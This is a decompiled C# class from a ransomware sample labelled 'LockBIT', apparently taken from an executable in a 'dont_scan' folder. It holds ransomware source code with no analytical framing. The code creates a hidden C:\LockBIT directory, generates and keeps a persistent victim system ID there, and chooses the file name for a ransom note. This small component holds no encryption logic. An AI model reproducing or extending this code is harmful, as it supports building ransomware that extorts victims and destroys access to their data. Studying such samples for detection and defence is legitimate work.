// Decompiled with JetBrains decompiler
// Type: LockBIT.SystemID
// Assembly: NeonGPT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3B7314DB-352E-40CA-8FA8-E49938AA8847
// Assembly location: C:\Users\Desktop\Desktop\dont_scan\apps\lockbit.exe

using System.IO;

#nullable disable
namespace LockBIT;

internal class SystemID
{
  public static string GetSystemID()
  {
    Directory.CreateDirectory("C:\\LockBIT");
    File.SetAttributes("C:\\LockBIT", File.GetAttributes("C:\\LockBIT") | FileAttributes.Hidden);
    if (File.Exists("C:\\LockBIT\\systemID"))
      return File.ReadAllText("C:\\LockBIT\\systemID");
    string upper = KeyGenerator.GetUniqueKey(12).ToUpper();
    File.WriteAllText("C:\\LockBIT\\systemID", upper);
    return upper;
  }

  public static string readME()
  {
    return !File.Exists("C:\\Readme.txt") ? "Readme.txt" : $"Readme-{Program.systemID}.txt";
  }
}
